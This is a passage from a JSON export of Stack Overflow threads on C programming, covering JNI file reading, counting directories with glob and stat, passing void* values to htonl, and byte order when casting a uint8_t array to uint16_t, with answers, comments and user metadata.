and then C code that uses a JNI interface, the task that i am trying to acomplish is to replace some of the java files with C source files and then use a JNI to achieve the same program but with C file included. Therefore i know there is no issue with the Java code. In a source file i have a function called readMap() which is causing the issue. </p>\n\n<p>I have managed to narrow down the issue to the fact that the C code for some reason will not read the map, the following if statement is executed when the function is called through the JNI: </p>\n\n<pre><code>if(in = fopen(\"../maps/example_map.txt\", \"r\") == NULL)\n        {\n           printf(\"Error opening file\\n\");\n           exit(-1);\n        }\n</code></pre>\n\n<p>However if i run just the C code from a main() in MainTest.c the function will read in the map fine and all of the C code will work, therefore i rules out the possibility of the class path being wrong.</p>\n\n<p>I have also narrowed out the JNI itself as other functions will be able to be called and return the desired result when they are called but if readMap() is called then it will not work. </p>\n\n<p>Basically i was wondering if anyone else has had a similar problem with this and what their fix was or if anyone has any ideas about what it could be?</p>\n"}, {"tags": ["c", "file", "counting", "stat"], "comments": [{"owner": {"reputation": 702, "user_id": 3777314, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/600103728/picture?type=large", "display_name": "ocket8888", "link": "https://stackoverflow.com/users/3777314/ocket8888"}, "edited": false, "score": 0, "creation_date": 1461779233, "post_id": 36896850, "comment_id": 61358566, "body": "use <code>S_ISREG()</code> to tell if a dir entry is a regular file, otherwise it&#39;s a directory (or a link)."}, {"owner": {"reputation": 131, "user_id": 5696892, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/62ef8f16982b513f3f4090bf10f29dbf?s=128&d=identicon&r=PG&f=1", "display_name": "Sebi95", "link": "https://stackoverflow.com/users/5696892/sebi95"}, "reply_to_user": {"reputation": 702, "user_id": 3777314, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/600103728/picture?type=large", "display_name": "ocket8888", "link": "https://stackoverflow.com/users/3777314/ocket8888"}, "edited": false, "score": 0, "creation_date": 1461780331, "post_id": 36896850, "comment_id": 61359281, "body": "It doesn&#39;t work..."}], "answers": [{"comments": [{"owner": {"reputation": 382, "user_id": 6262880, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/bb62dec99249c4c6f18edf4960a8ef30?s=128&d=identicon&r=PG&f=1", "display_name": "rio.irikami", "link": "https://stackoverflow.com/users/6262880/rio-irikami"}, "reply_to_user": {"reputation": 131, "user_id": 5696892, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/62ef8f16982b513f3f4090bf10f29dbf?s=128&d=identicon&r=PG&f=1", "display_name": "Sebi95", "link": "https://stackoverflow.com/users/5696892/sebi95"}, "edited": false, "score": 0, "creation_date": 1461781600, "post_id": 36897650, "comment_id": 61360074, "body": "edited:) you can use my <code>countDirectories</code> as your <code>listdir</code> function. <code>glob</code> is the function searches files/directories by <i>pattern</i>. and using flag <code>GLOB_ONLYDIR</code>, we can search only the directory. as a result of this, you can find the number of directories in the <code>path</code>."}], "tags": [], "owner": {"reputation": 382, "user_id": 6262880, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/bb62dec99249c4c6f18edf4960a8ef30?s=128&d=identicon&r=PG&f=1", "display_name": "rio.irikami", "link": "https://stackoverflow.com/users/6262880/rio-irikami"}, "is_accepted": false, "score": 0, "last_activity_date": 1461781354, "last_edit_date": 1461781354, "creation_date": 1461780478, "answer_id": 36897650, "question_id": 36896850, "link": "https://stackoverflow.com/questions/36896850/how-to-count-only-the-number-of-directories-from-a-path/36897650#36897650", "title": "How to count only the number of directories from a path", "body": "<p>I think you want...</p>\n\n<ul>\n<li>written in C</li>\n<li>count the number of directoriesfrom a path.</li>\n<li>the counting function will returns <code>int</code> value.</li>\n</ul>\n\n<p>I have no idea about your environment, so it is just a example solution.</p>\n\n<p>If you can use <a href=\"http://man7.org/linux/man-pages/man3/glob.3.html\" rel=\"nofollow\">glob</a>, it is so easy to count the number of directories. that is: main.c</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;glob.h&gt;\n#include &lt;string.h&gt;\n\n#define MAX_PATH 1023\n\nint countDirectories(char* dir)\n{\n    char path[MAX_PATH] = \"\";\n    strcat(path, dir);\n    strcat(path, \"/*\");\n\n    glob_t globbuf;\n    long i, count = 0;\n\n    if (glob(path, GLOB_NOSORT | GLOB_ONLYDIR, NULL, &amp;globbuf) == 0)\n    {\n        count = globbuf.gl_pathc;\n        for (i = 0; i &lt; globbuf.gl_pathc; i++)\n        {\n            count += countDirectories(globbuf.gl_pathv[i]);\n        }\n    }\n    globfree(&amp;globbuf);\n\n    return count;\n}\n\nint main(int argc, char* argv[])\n{\n    int count;\n\n    if (argc &gt; 1)\n    {\n        count = countDirectories(argv[1]);\n    }\n    else\n    {\n        count = countDirectories(\".\");\n    }\n\n    printf(\"there are %d directories.\\n\", count);\n\n    return 0;\n}\n</code></pre>\n\n<p>and you can try this like:</p>\n\n<pre><code>&gt; gcc main.c -o testglob\n&gt; ./testglob /path/to/target/dir\n</code></pre>\n\n<p>then you'll receive output like this:</p>\n\n<pre><code>path = /path/to/target/dir/*, there are N directories\n</code></pre>\n\n<p>thanks.</p>\n"}, {"comments": [{"owner": {"reputation": 131, "user_id": 5696892, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/62ef8f16982b513f3f4090bf10f29dbf?s=128&d=identicon&r=PG&f=1", "display_name": "Sebi95", "link": "https://stackoverflow.com/users/5696892/sebi95"}, "edited": false, "score": 0, "creation_date": 1461780757, "post_id": 36897699, "comment_id": 61359535, "body": "could you explain a little how to do?"}, {"owner": {"reputation": 131, "user_id": 5696892, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/62ef8f16982b513f3f4090bf10f29dbf?s=128&d=identicon&r=PG&f=1", "display_name": "Sebi95", "link": "https://stackoverflow.com/users/5696892/sebi95"}, "edited": false, "score": 0, "creation_date": 1461875444, "post_id": 36897699, "comment_id": 61410989, "body": "Stian, how can i use chdir on windows?"}, {"owner": {"reputation": 2048, "user_id": 6192747, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-agy-meieasc/AAAAAAAAAAI/AAAAAAAAAC8/ipYF1p3tygQ/photo.jpg?sz=128", "display_name": "Stian Skjelstad", "link": "https://stackoverflow.com/users/6192747/stian-skjelstad"}, "reply_to_user": {"reputation": 131, "user_id": 5696892, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/62ef8f16982b513f3f4090bf10f29dbf?s=128&d=identicon&r=PG&f=1", "display_name": "Sebi95", "link": "https://stackoverflow.com/users/5696892/sebi95"}, "edited": false, "score": 0, "creation_date": 1461877419, "post_id": 36897699, "comment_id": 61412010, "body": "first hit on google reveals <a href=\"https://msdn.microsoft.com/en-us/library/ms235420.aspx\" rel=\"nofollow noreferrer\">msdn.microsoft.com/en-us/library/ms235420.aspx</a> and <a href=\"https://msdn.microsoft.com/en-us/library/bf7fwze1.aspx\" rel=\"nofollow noreferrer\">msdn.microsoft.com/en-us/library/bf7fwze1.aspx</a>"}], "tags": [], "owner": {"reputation": 2048, "user_id": 6192747, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-agy-meieasc/AAAAAAAAAAI/AAAAAAAAAC8/ipYF1p3tygQ/photo.jpg?sz=128", "display_name": "Stian Skjelstad", "link": "https://stackoverflow.com/users/6192747/stian-skjelstad"}, "is_accepted": true, "score": 1, "last_activity_date": 1461781375, "last_edit_date": 1461781375, "creation_date": 1461780635, "answer_id": 36897699, "question_id": 36896850, "link": "https://stackoverflow.com/questions/36896850/how-to-count-only-the-number-of-directories-from-a-path/36897699#36897699", "title": "How to count only the number of directories from a path", "body": "<p>your stat() call will fail, since you are not in the correct directory. This you can solve by either changing the current directory, or generate full paths and give to stat as argument.</p>\n\n<p>Some Unixes, you can optimize away the stat call by looking at struct dirent, the d_type field</p>\n\n<pre><code>int listdir(char *dir) {\n    struct dirent *dp;\n    struct stat s;\n    DIR *fd;\n    int count = 0;\n\n    if ((fd = opendir(dir)) == NULL) {\n        fprintf(stderr, \"listdir: can't open %s\\n\", dir);\n    }\n    chdir (dir); /* needed for stat to work */\n    while ((dp = readdir(fd)) != NULL) {\n        if (!strcmp(dp-&gt;d_name, \".\") || !strcmp(dp-&gt;d_name, \"..\"))\n            continue;\n#ifdef _DIRENT_HAVE_D_TYPE\n        switch (dp-&gt;d_type)\n        {\n          case DT_UNKNOWN:\n            stat(dp-&gt;d_name, &amp;s);\n            if (S_ISDIR(s.st_mode)) count++;\n            break;\n          case DT_DIR:\n            count++;\n            break;\n        }\n#else\n        stat(dp-&gt;d_name, &amp;s);\n        if (S_ISDIR(s.st_mode)) count++;\n#endif            \n    }\n    closedir(fd);\n    return count;\n}\n</code></pre>\n"}], "owner": {"reputation": 131, "user_id": 5696892, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/62ef8f16982b513f3f4090bf10f29dbf?s=128&d=identicon&r=PG&f=1", "display_name": "Sebi95", "link": "https://stackoverflow.com/users/5696892/sebi95"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 90, "favorite_count": 0, "accepted_answer_id": 36897699, "answer_count": 2, "score": 1, "last_activity_date": 1461781375, "creation_date": 1461778106, "last_edit_date": 1461778497, "question_id": 36896850, "link": "https://stackoverflow.com/questions/36896850/how-to-count-only-the-number-of-directories-from-a-path", "title": "How to count only the number of directories from a path", "body": "<p>I am trying to count only the directories from a path, but it doesn't work. So, i don't want to number both files and directories, i want only the directories. Could you help me, please?\nThe code:</p>\n\n<pre><code>int listdir(char *dir) {\n    struct dirent *dp;\n    struct stat s;\n    DIR *fd;\n    int count = 0;\n\n    if ((fd = opendir(dir)) == NULL) {\n        fprintf(stderr, \"listdir: can't open %s\\n\", dir);\n    }\n    while ((dp = readdir(fd)) != NULL) {\n        if (!strcmp(dp-&gt;d_name, \".\") || !strcmp(dp-&gt;d_name, \"..\"))\n            continue;\n        stat(dp-&gt;d_name, &amp;s);\n        if (S_ISDIR(s.st_mode))\n        count++;\n    }\n    closedir(fd);\n    return count;\n}\n</code></pre>\n"}, {"tags": ["c", "void-pointers", "htonl"], "comments": [{"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "edited": false, "score": 3, "creation_date": 1461777254, "post_id": 36896452, "comment_id": 61357258, "body": "What does the <code>void*</code> actually represent in your code? What exactly are you pointing at that needs to be sent over the network? <code>htonl()</code> and <code>ntohl()</code> only works on integers, not on pointers. <i>IF</i> the <code>void*</code> contains the actual integer value itself, rather than pointing at an integer elsewhere in memory, then you can type-cast the <code>void*</code> as-is, eg: <code>uint32_t value = htonl((uint32_t)(kv-&gt;value));</code> <i>IF</i> the <code>void*</code> points at an integer elsewhere in memory, you need to type-cast the pointer and then dereference it to get the pointed value, eg: <code>uint32_t value = htonl(*(uint32_t*)(kv-&gt;value));</code>"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 2, "creation_date": 1461777265, "post_id": 36896452, "comment_id": 61357270, "body": "A pointer value in one process has no meaning to another process.  What kind of data are you actually trying to pass around?"}], "answers": [{"comments": [{"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "edited": false, "score": 0, "creation_date": 1461777314, "post_id": 36896543, "comment_id": 61357299, "body": "This assumes the <code>void*</code> is pointing at a <code>long</code> variable stored elsewhere in memory."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "edited": false, "score": 0, "creation_date": 1461777362, "post_id": 36896543, "comment_id": 61357331, "body": "@RemyLebeau Just added a note about that."}, {"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "edited": false, "score": 1, "creation_date": 1461777561, "post_id": 36896543, "comment_id": 61357464, "body": "If the <code>void*</code> points at a <code>short</code> variable, then you need to cast the <code>void*</code> to a <code>short*</code> instead of a <code>uint32*</code>. You have to cast to the correct data type. But it is perfectly fine to pass a <code>short</code> value to <code>htonl()</code>, it will simply be extended to 32 bits. Otherwise, use <code>htons()</code> instead."}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": true, "score": 2, "last_activity_date": 1461777444, "last_edit_date": 1461777444, "creation_date": 1461777205, "answer_id": 36896543, "question_id": 36896452, "link": "https://stackoverflow.com/questions/36896452/converting-from-void-to-use-htonl/36896543#36896543", "title": "Converting from void * to use htonl", "body": "<p>You can't dereference a <code>void *</code> type directly, you have to first cast it to something you can dereference and dereference that.</p>\n\n<p>For example</p>\n\n<pre><code>uint32_t value = htonl(*(uint32_t *) kv-&gt;value);\n</code></pre>\n\n<p>This casting and dereferencing requires that <code>kv-&gt;value</code> actually points to something that is the type you try to cast it to. If, in your code, <code>kv-&gt;value</code> points to a single <code>short</code> value then the above cast and dereferencing will lead to <em>undefined behavior</em>.</p>\n"}], "owner": {"reputation": 96, "user_id": 4945005, "user_type": "registered", "accept_rate": 25, "profile_image": "https://lh6.googleusercontent.com/-hOuw9cMmfAk/AAAAAAAAAAI/AAAAAAAAAB0/CnLNvRh45Xc/photo.jpg?sz=128", "display_name": "Tyler Hendrick", "link": "https://stackoverflow.com/users/4945005/tyler-hendrick"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 303, "favorite_count": 0, "accepted_answer_id": 36896543, "answer_count": 1, "score": 0, "last_activity_date": 1461777444, "creation_date": 1461776921, "question_id": 36896452, "link": "https://stackoverflow.com/questions/36896452/converting-from-void-to-use-htonl", "title": "Converting from void * to use htonl", "body": "<p>I have a void * value in a structure and I need to send it through a socket to a server. I know I need to use</p>\n\n<pre><code>int value = htonl(kv-&gt;value);\n</code></pre>\n\n<p>but the compiler is throwing errors</p>\n\n<pre><code>passing argument 1 of \u2018htonl\u2019 makes integer from pointer without a cast [-Werror]\n</code></pre>\n\n<p>I also tried casting the void * to an int, did not work and I used </p>\n\n<pre><code>htonl(*kv-&gt;value);\n</code></pre>\n\n<p>but that also threw errors. How do I get the void * to the right data type?</p>\n\n<p>Side note: The structure is not editable as I am writing a framework.</p>\n\n<pre><code>struct kvpair {\n    void *value;\n};\n</code></pre>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 6, "creation_date": 1461776988, "post_id": 36896420, "comment_id": 61357079, "body": "This is due to <a href=\"https://en.wikipedia.org/wiki/Endianness\" rel=\"nofollow noreferrer\">endianness</a>. You won&#39;t solve it by casting: your shift-and-add (or) is good."}, {"owner": {"reputation": 2558, "user_id": 655436, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/98da4e7757d5f0e8596fd832bebee3d0?s=128&d=identicon&r=PG", "display_name": "fukanchik", "link": "https://stackoverflow.com/users/655436/fukanchik"}, "edited": false, "score": 0, "creation_date": 1461777032, "post_id": 36896420, "comment_id": 61357108, "body": "<a href=\"http://stackoverflow.com/questions/22030657/little-endian-vs-big-endian\" title=\"little endian vs big endian\">stackoverflow.com/questions/22030657/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461778327, "post_id": 36896857, "comment_id": 61357993, "body": "What has <code>uint64_t</code> to do with either the question or the 2-byte array? This seems to have over-complicated a simple issue."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461778744, "post_id": 36896857, "comment_id": 61358265, "body": "Sorry, my DV because <code>1</code> is never stored as <code>10000000</code>"}, {"owner": {"reputation": 10563, "user_id": 1104328, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/df0790774838286ad0d93567ae1fcf56?s=128&d=identicon&r=PG&f=1", "display_name": "Harry", "link": "https://stackoverflow.com/users/1104328/harry"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461778830, "post_id": 36896857, "comment_id": 61358322, "body": "I don&#39;t understand. I didn&#39;t say it was stored as <code>100000001 </code> I used two bytes to demonstrate that it was stored with the first byte appearing to the left."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461779007, "post_id": 36896857, "comment_id": 61358433, "body": "The first byte on the left binary <code>10000000</code> is decimal <code>128</code>. You are bent on confusing OP further."}, {"owner": {"reputation": 10563, "user_id": 1104328, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/df0790774838286ad0d93567ae1fcf56?s=128&d=identicon&r=PG&f=1", "display_name": "Harry", "link": "https://stackoverflow.com/users/1104328/harry"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461779098, "post_id": 36896857, "comment_id": 61358490, "body": "No, the first byte to the machine has value <code>1</code>. If you read it like a human it has value 128 but I&#39;m talking about the byte representation that the machine has in RAM."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1461779609, "post_id": 36896857, "comment_id": 61358809, "body": "Nobody writes bits as little-endian, whatever the byte endianness."}, {"owner": {"reputation": 10563, "user_id": 1104328, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/df0790774838286ad0d93567ae1fcf56?s=128&d=identicon&r=PG&f=1", "display_name": "Harry", "link": "https://stackoverflow.com/users/1104328/harry"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461779773, "post_id": 36896857, "comment_id": 61358935, "body": "@WeatherVane I just updated the answer to display a little endian and big endian <code>1</code>. Please explain why the bit is set where it is in big endian format if nobody write it this way?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461779836, "post_id": 36896857, "comment_id": 61358979, "body": "Because bit 7 is decimal <code>128</code>, not <code>1</code>. Surely with your rep, you know that?"}, {"owner": {"reputation": 10563, "user_id": 1104328, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/df0790774838286ad0d93567ae1fcf56?s=128&d=identicon&r=PG&f=1", "display_name": "Harry", "link": "https://stackoverflow.com/users/1104328/harry"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461796412, "post_id": 36896857, "comment_id": 61368285, "body": "My understanding on Intel is it&#39;s consistently little endian ie the lowest address of bit 0 == the lowest address of byte 0."}, {"owner": {"reputation": 10563, "user_id": 1104328, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/df0790774838286ad0d93567ae1fcf56?s=128&d=identicon&r=PG&f=1", "display_name": "Harry", "link": "https://stackoverflow.com/users/1104328/harry"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461815100, "post_id": 36896857, "comment_id": 61373408, "body": "@WeatherVane My wife assures me that reputation gained answering questions on stackoverflow is inversely related to intelligence :)"}], "tags": [], "owner": {"reputation": 10563, "user_id": 1104328, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/df0790774838286ad0d93567ae1fcf56?s=128&d=identicon&r=PG&f=1", "display_name": "Harry", "link": "https://stackoverflow.com/users/1104328/harry"}, "is_accepted": false, "score": -1, "last_activity_date": 1461805916, "last_edit_date": 1461805916, "creation_date": 1461778125, "answer_id": 36896857, "question_id": 36896420, "link": "https://stackoverflow.com/questions/36896420/casting-uint8-t-array-into-uint16-t-value-in-c/36896857#36896857", "title": "Casting uint8_t array into uint16_t value in C", "body": "<p>This might help to visualize things. When you create the array you have two bytes in order. When you print it you get the human readable hex value which is the opposite of the little endian way it was stored. The value <code>1</code> in little endian as a uint16_t type is stored as follows where a0 is a lower address than a1... </p>\n\n<pre><code> a0       a1\n|10000000|00000000\n</code></pre>\n\n<p>Note, the least significant byte is first, but when we print the value in hex it the least significant byte appears on the right which is what we normally expect on any machine.</p>\n\n<p>This program prints a little endian and big endian <code>1</code> in binary starting from least significant byte...</p>\n\n<pre><code>#include &lt;stdint.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;arpa/inet.h&gt;\n\nvoid print_bin(uint64_t num, size_t bytes) {\n  int i = 0;\n  for(i = bytes * 8; i &gt; 0; i--) {\n    (i % 8 == 0) ? printf(\"|\") : 1;\n    (num &amp; 1)    ? printf(\"1\") : printf(\"0\");\n    num &gt;&gt;= 1;\n  }\n  printf(\"\\n\");\n}\nint main(void) {\n  uint8_t a[2] = {0x15, 0xaa};\n  uint16_t b = *(uint16_t*)a;\n  uint16_t le = 1;\n  uint16_t be = htons(le);\n\n  printf(\"Little Endian 1\\n\");\n  print_bin(le, 2); \n  printf(\"Big Endian 1 on little endian machine\\n\");\n  print_bin(be, 2); \n  printf(\"0xaa15 as little endian\\n\");\n  print_bin(b, 2); \n  return 0;\n}\n</code></pre>\n\n<p>This is the output (this is Least significant byte first)</p>\n\n<pre><code>Little Endian 1\n|10000000|00000000\nBig Endian 1 on little endian machine\n|00000000|10000000\n0xaa15 as little endian\n|10101000|01010101\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1064, "user_id": 3060498, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/I85mo.jpg?s=128&g=1", "display_name": "Felipe Sulser", "link": "https://stackoverflow.com/users/3060498/felipe-sulser"}, "is_accepted": false, "score": 0, "last_activity_date": 1461778539, "creation_date": 1461778539, "answer_id": 36897008, "question_id": 36896420, "link": "https://stackoverflow.com/questions/36896420/casting-uint8-t-array-into-uint16-t-value-in-c/36897008#36897008", "title": "Casting uint8_t array into uint16_t value in C", "body": "<p>This is because of the endianess of your machine.</p>\n\n<p>In order to make your code independent of the machine consider the following function:</p>\n\n<pre><code>#define LITTLE_ENDIAN 0\n#define BIG_ENDIAN    1\n\nint endian() {\n    int i = 1;\n    char *p = (char *)&amp;i;\n\n    if (p[0] == 1)\n        return LITTLE_ENDIAN;\n    else\n        return BIG_ENDIAN;\n}\n</code></pre>\n\n<p>So for each case you can choose which operation to apply.</p>\n"}, {"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 7, "last_activity_date": 1461778565, "creation_date": 1461778565, "answer_id": 36897015, "question_id": 36896420, "link": "https://stackoverflow.com/questions/36896420/casting-uint8-t-array-into-uint16-t-value-in-c/36897015#36897015", "title": "Casting uint8_t array into uint16_t value in C", "body": "<p>As mentioned in the comments, this is due to <a href=\"https://en.wikipedia.org/wiki/Endianness\">endianness</a>.</p>\n\n<p>Your machine is little-endian, which (among other things) means that multi-byte integer values have the least significant byte first.</p>\n\n<p>If you compiled and ran this code on a big-endian machine (ex. a Sun), you would get the result you expect.</p>\n\n<p>Since your array is set up as big-endian, which also happens to be network byte order, you could get around this by using <code>ntohs</code> and <code>htons</code>.  These functions convert a 16-bit value from network byte order (big endian) to the host's byte order and vice versa:</p>\n\n<pre><code>uint16_t b = ntohs(*(uint16_t*)a);\n</code></pre>\n\n<p>There are similar functions called <code>ntohl</code> and <code>htonl</code> that work on 32-bit values.</p>\n"}, {"tags": [], "owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "is_accepted": false, "score": 0, "last_activity_date": 1461807710, "last_edit_date": 1495535633, "creation_date": 1461807710, "answer_id": 36903788, "question_id": 36896420, "link": "https://stackoverflow.com/questions/36896420/casting-uint8-t-array-into-uint16-t-value-in-c/36903788#36903788", "title": "Casting uint8_t array into uint16_t value in C", "body": "<p>You cannot do anything like <code>*(uint16_t*)a</code> because of the <a href=\"https://stackoverflow.com/questions/98650/what-is-the-strict-aliasing-rule\">strict aliasing rule</a>. Even if code appears to work for now, it may break later in a different compiler version.</p>\n\n<p>A correct version of the code could be:</p>\n\n<pre><code>b = ((uint16_t)a[0] &lt;&lt; CHAR_BIT) + a[1];\n</code></pre>\n\n<p>The version suggested in your question involving <code>a[0] &lt;&lt; 8</code> is incorrect because on a system with 16-bit <code>int</code>, this may cause signed integer overflow: <code>a[0]</code> promotes to <code>int</code>, and <code>&lt;&lt; 8</code> means <code>* 256</code>.</p>\n"}], "owner": {"reputation": 33, "user_id": 6262706, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aa3968d60153788a55a32aa3a47cf564?s=128&d=identicon&r=PG&f=1", "display_name": "banks", "link": "https://stackoverflow.com/users/6262706/banks"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4041, "favorite_count": 1, "accepted_answer_id": 36897015, "answer_count": 4, "score": 3, "last_activity_date": 1461807710, "creation_date": 1461776837, "question_id": 36896420, "link": "https://stackoverflow.com/questions/36896420/casting-uint8-t-array-into-uint16-t-value-in-c", "title": "Casting uint8_t array into uint16_t value in C", "body": "<p>I'm trying to convert a 2-byte array into a single 16-bit value. For some reason, when I cast the array as a 16-bit pointer and then dereference it, the byte ordering of the value gets swapped.</p>\n\n<p>For example,</p>\n\n<pre><code>#include &lt;stdint.h&gt;\n#include &lt;stdio.h&gt;\n\nmain()\n{\n    uint8_t a[2] = {0x15, 0xaa};\n\n    uint16_t b = *(uint16_t*)a;\n    printf(\"%x\\n\", (unsigned int)b);\n    return 0;\n}\n</code></pre>\n\n<p>prints <code>aa15</code> instead of <code>15aa</code> (which is what I would expect).</p>\n\n<p>What's the reason behind this, and is there an easy fix?</p>\n\n<p>I'm aware that I can do something like <code>uint16_t b = a[0] &lt;&lt; 8 | a[1];</code> (which does work just fine), but I feel like this problem should be easily solvable with casting and I'm not sure what's causing the issue here.</p>\n"}, {"tags": ["c", "linux", "sockets", "file-descriptor"], "comments": [{"owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": 